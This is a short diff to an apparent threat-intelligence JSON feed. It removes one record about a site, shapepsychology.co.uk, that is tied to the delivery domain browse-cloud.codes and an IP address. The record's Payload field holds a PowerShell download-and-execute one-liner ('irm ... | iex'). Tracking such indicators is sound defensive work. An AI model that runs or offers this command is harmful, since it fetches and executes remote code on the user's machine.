@@ -11914,27 +11914,5 @@
     ],
     "ReportId": "cmwl827eg1hvt0oml47393f2u",
     "ScannedAt": "2026-11-17T21:46:14.182000+00:00"
-  },
-  {
-    "UrlDomain": "shapepsychology.co.uk",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "162.255.118.66"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/e1869d542b246dfd",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/e1869d542b246dfd'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/e1869d542b246dfd"
-    ],
-    "ReportId": "cmwl6sv421hpq0omls4ocdb1w",
-    "ScannedAt": "2026-11-17T21:10:58.737000+00:00"
   }
 ]
